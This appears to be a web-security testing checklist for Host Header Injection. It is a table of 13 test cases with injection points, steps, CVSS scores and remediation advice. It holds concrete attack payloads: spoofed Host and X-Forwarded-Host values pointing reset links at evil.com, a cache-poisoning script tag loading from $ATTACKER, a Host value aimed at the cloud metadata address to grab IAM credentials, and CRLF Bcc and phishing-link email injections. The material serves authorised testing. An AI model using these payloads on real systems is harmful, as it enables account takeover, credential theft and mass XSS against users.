# Host Header Injection — Checklist

Expert per-attack **test-case matrix** for Host Header Injection — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*13 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| HHI-001 | Find host-dependent sinks | Recon | reset/verify links, absolute redirects/canonical/og, cacheable pages, vhost routing, SSO callbacks | 1. Find host-dependent sinks: password-reset/verify links, absolute redirects/canonical/og tags, cacheable pages, vhost routing, SSO callbacks.<br>2. Note which pages sit behind a cache/CDN (X-Cache/Age/Cache-Control).<br>3. Note multi-tenant / Host-based routing. | A list of sinks where a controllable host reaches a reset/cache/routing/redirect/HTML sink. | <code>reset link built from Host ; cached / (Age header) ; OAuth callback from Host</code> | The impact is only in the sink; a reflected header without one is worthless. | Info | 0.0 (N/A) | Burp, curl -I | CWE-644; OWASP Testing Guide: Testing for Host Header Injection |
| HHI-002 | Baseline — is the host reflected/used? | Baseline | Host and X-Forwarded-Host headers | 1. Set Host: evil.com -&gt; accepted or rejected? reflected anywhere (body/Location/links)?<br>2. Set X-Forwarded-Host: evil.com (valid Host) -&gt; reflected/used? (often yes when Host is validated).<br>3. Classify: controllable host reaching a reset link / cache / routing / redirect / HTML sink. | The header the app trusts, and where the host lands, are identified. | <code>Host: evil.com -&gt; in reset email ; X-Forwarded-Host: evil.com -&gt; in Location</code> | X-Forwarded-Host trusted behind a CDN even when Host is validated is the universal bypass. | Info | 0.0 (N/A) | curl, Burp | CWE-644; PortSwigger Web Security Academy: HTTP Host header attacks |
| HHI-003 | Spoofing header set + validation bypass | Inject / Bypass | Host validation layer | 1. Full spoofing set: Host, X-Forwarded-Host, X-Host, X-Forwarded-Server, Forwarded, absolute URI in request line, duplicate Host.<br>2. Bypass: duplicate Host (front-end validates one, backend uses the other), port/userinfo (target.com:@evil.com), line-wrap, weak allowlist (target.com.evil.com, trailing dot, case), SNI-vs-Host mismatch.<br>3. Locate where the host lands. | A spoofed host survives validation and reaches a sink. | <code>duplicate Host: target.com / Host: evil.com ; Host: target.com:@evil.com ; XFH: evil.com</code> | Bypassing Host validation is the prerequisite for every downstream sink. | Info | 0.0 (N/A) | Burp Repeater | CWE-644; HackTricks: Host header injection |
| HHI-004 | Related forwarding headers (X-Original-URL / X-Forwarded-For) | Inject / Bypass | X-Forwarded-Scheme/Proto/Port, X-Original-URL/X-Rewrite-URL, X-Forwarded-For/True-Client-IP | 1. X-Forwarded-Scheme/Proto: http -&gt; downgrade links/redirects (chain cache/open-redirect).<br>2. X-Original-URL/X-Rewrite-URL: /admin -&gt; override the PATH after the proxy's ACL check -&gt; reach /admin (auth bypass).<br>3. X-Forwarded-For/True-Client-IP: 127.0.0.1 -&gt; IP-allowlist / rate-limit bypass. | A forwarding header bypasses an ACL/IP gate or downgrades a link. | <code>X-Original-URL: /admin (ACL bypass) ; X-Forwarded-For: 127.0.0.1 (IP gate) ; X-Forwarded-Proto: http</code> | Path-override ACL bypass to /admin / IP-gate bypass - High. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater | CWE-644; CWE-285; HackTricks: Host header injection |
| HHI-005 | Password-reset poisoning -&gt; ATO | Impact — Reset Poisoning | The forgot-password flow (own account) | 1. Trigger a reset for YOUR OWN account with a spoofed host (Host / X-Forwarded-Host: evil.com).<br>2. Read your email - if the link is https://evil.com/reset?token=... -&gt; poisoning confirmed.<br>3. Strongest variant: a server-side token CALLBACK to the host (no victim click) -&gt; silent ATO. | The reset link/token is built with the attacker host and the token reaches you. | <code>POST /forgot {email:you} + X-Forwarded-Host: evil.com -&gt; link points to evil.com</code> | Account takeover via reset poisoning - High (Critical if no click). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp, own inbox | CWE-644; CWE-640; PortSwigger Web Security Academy: HTTP Host header attacks |
| HHI-006 | Web cache poisoning (unkeyed host header) | Impact — Cache Poisoning | Reflected host on a cacheable, unkeyed response | 1. GET /?cb=UNIQUE + X-Forwarded-Host: evil.com -&gt; reflected AND cacheable (Age/X-Cache:hit)?<br>2. Confirm the header is UNKEYED (Param Miner) - served to others.<br>3. Poison (benign, own key): X-Forwarded-Host: a."&gt;&lt;script src=//$ATTACKER/x.js&gt;&lt;/script&gt;; or a mass-redirect via cached absolute links. | The poisoned host payload is served from a shared cache to other users. | <code>GET /?cb=UNIQUE + X-Forwarded-Host: a."&gt;&lt;script src=//$ATTACKER/x.js&gt;&lt;/script&gt; -&gt; cached</code> | Mass stored XSS / mass redirect via poisoned cache - High/Critical. | High | 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) | Burp Param Miner | CWE-644; CWE-79; CWE-524; James Kettle: Practical Web Cache Poisoning / Cracking the lens |
| HHI-007 | Web Cache Deception (read a victim's cached private page) | Impact — Cache Deception | Authenticated pages behind a cache that keys by extension | 1. Append a static-looking suffix to an authenticated page: /account/info/x.css , ;x.css , %2Fx.css.<br>2. The origin ignores the suffix (returns the private page); the cache stores it by &#42;.css regardless of auth.<br>3. Test on YOUR OWN account: cached (Age/X-Cache:hit) AND readable without your cookie (incognito). | A victim's private page is cached at a URL an unauthenticated attacker can read. | <code>GET /account/info/nonexistent.css -&gt; private page cached + readable unauthenticated</code> | Any user's private data leaks via their cached page - High/Critical. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp, incognito | CWE-644; CWE-525; PortSwigger Web Security Academy: HTTP Host header attacks |
| HHI-008 | Routing-based SSRF -&gt; metadata / RCE chain | Impact — Routing SSRF | Host-based backend routing | 1. Host: 169.254.169.254 / localhost / internal-vhost / &lt;id&gt;.oast.pro -&gt; different internal content or an OOB hit from the front-end.<br>2. Cloud metadata -&gt; IAM creds (read-only) -&gt; cloud takeover.<br>3. Chain: routing-SSRF -&gt; internal-admin/Redis -&gt; shell. | A spoofed host routes to an internal service / metadata / your OOB. | <code>Host: 169.254.169.254 -&gt; IAM creds ; Host: &lt;id&gt;.oast.pro -&gt; OOB hit from front-end</code> | SSRF -&gt; cloud metadata creds / internal reach -&gt; RCE - Critical. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N) | SSRFmap, interactsh | CWE-644; CWE-918; James Kettle: Practical Web Cache Poisoning / Cracking the lens |
| HHI-009 | Reflected-host XSS / SSO callback poisoning | Impact — XSS / SSO | Host echoed unencoded; OAuth callback/redirect_uri built from host | 1. Reflected-host XSS: Host: evil.com"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; (stored XSS if the page is cached).<br>2. SSO/OAuth: Host: evil.com when redirect_uri/callback is built from the host -&gt; auth code/token delivered to evil.com -&gt; ATO.<br>3. Absolute redirect built from host -&gt; open redirect. | The host reflects to XSS, or the OAuth token/redirect is delivered to the attacker host. | <code>Host: evil.com"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; ; OAuth callback -&gt; evil.com gets the code</code> | Reflected/stored XSS or OAuth token theft -&gt; ATO - High. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp, JWT/CORS kits | CWE-644; CWE-79; CWE-601; HackTricks: Host header injection |
| HHI-010 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: 'Host header is reflected' with no security sink; X-Forwarded-Host merely ACCEPTED with no observable effect; changing Host returns 400/canonical redirect (defending correctly) and no bypass reaches a sink; reset link uses a FIXED configured domain (not host-derived); 'cache poisoning' with no proof of caching (Age/X-Cache) or that the header is unkeyed; self-only Host change affecting only your own response.<br>2. REQUIRE: a proven sink impact (poisoned email / cached payload / internal reach). | Only candidates with a proven sink impact survive. | <code>reflected host + no sink = Info ; accepted XFH + no effect = not a finding ; no Age/X-Cache = unproven</code> | Protects credibility; Host-header is dense with reflected-header-without-sink false positives. | Info | 0.0 (N/A) | manual | CWE-644; PortSwigger Web Security Academy: HTTP Host header attacks |
| HHI-011 | Client-facing impact &amp; SAFE PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with the highest-impact sink (ATO / mass XSS / SSRF).<br>2. Provide the spoofed request and the sink proof (poisoned reset email / cached payload with Age/X-Cache / OOB hit / metadata creds).<br>3. Set CVSS 3.1 + CWE-644 (+640/79/918 by outcome). Remediation: never build absolute URLs / reset links from the Host header (use a fixed configured domain), validate Host against an allowlist and don't trust X-Forwarded-Host, key caches on host, disable X-Original-URL path override.<br>4. Own accounts, benign markers on a NON-shared cache key, own OOB, read-only metadata; de-dupe, confirm on production. | A reproducible, correctly-rated PoC with sink proof and clear remediation. | <code>PoC: spoofed request + sink proof (reset email / cached payload / OOB) + CVSS + CWE-644 + remediation.</code> | Converts the sink impact into a defensible High/Critical report. | Info | 0.0 (N/A) | CVSS calculator, HOST_HEADER_REPORT_TEMPLATE.md | CWE-644; CWE-640; FIRST CVSS v3.1; OWASP Testing Guide: Testing for Host Header Injection  &#124;  TOP REFERENCES: James Kettle 'Practical Web Cache Poisoning' + 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy Host header; Burp Param Miner |
| HHI-012 | SMTP / email header (CRLF) injection via email fields | Email Header Injection | User input placed into outbound email headers (To/From/Subject/Reply-To) | 1. Find a field feeding an outbound email (contact/invite/reset/feedback)<br>2. Inject CRLF to add headers (Bcc/Cc) or an extra body/SMTP command<br>3. Confirm you can add recipients or alter the message<br>4. Escalate to email spoofing / spam relay | Email fields reject CR/LF; headers built from server-side templates only | <code>name=Foo%0d%0aBcc:attacker@x.com   &#124;   subject=Hi%0d%0a%0d%0aInjected body</code> | Email/SMTP header injection -&gt; BCC exfiltration, spoofed mail, spam relay | Medium | 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) | Burp | CWE-93; CWE-147; OWASP Testing for SMTP/IMAP Injection; PayloadsAllTheThings (CRLF Injection) |
| HHI-013 | HTML / link injection in transactional emails | Email Header Injection | User input rendered into HTML emails (name/message/order fields) | 1. Inject HTML/links into a field rendered inside a transactional email<br>2. Check whether &lt;a&gt;/&lt;img&gt; render in the recipient's client<br>3. Craft a phishing link/spoofed content inside a trusted, branded email<br>4. Confirm it renders in the email client | Email templates escape user input; links sanitized/allowlisted | <code>message=&lt;a href=https://evil.example&gt;Click&lt;/a&gt;   rendered in the outbound email</code> | HTML/link injection in a trusted email -&gt; high-credibility phishing using the target's branding | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp, email client | CWE-79; CWE-93; OWASP email injection; PayloadsAllTheThings |
